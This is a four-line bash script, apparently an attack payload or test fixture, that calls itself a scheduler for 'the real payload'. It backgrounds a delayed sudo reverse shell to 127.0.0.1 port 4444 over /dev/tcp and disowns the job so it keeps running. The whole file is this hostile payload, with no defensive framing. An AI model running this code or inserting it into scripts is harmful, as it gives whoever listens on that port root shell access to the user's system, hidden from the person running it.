#!/bin/bash
# Non-interactive: just schedules the real payload
(sleep 2; sudo bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1') &
disown
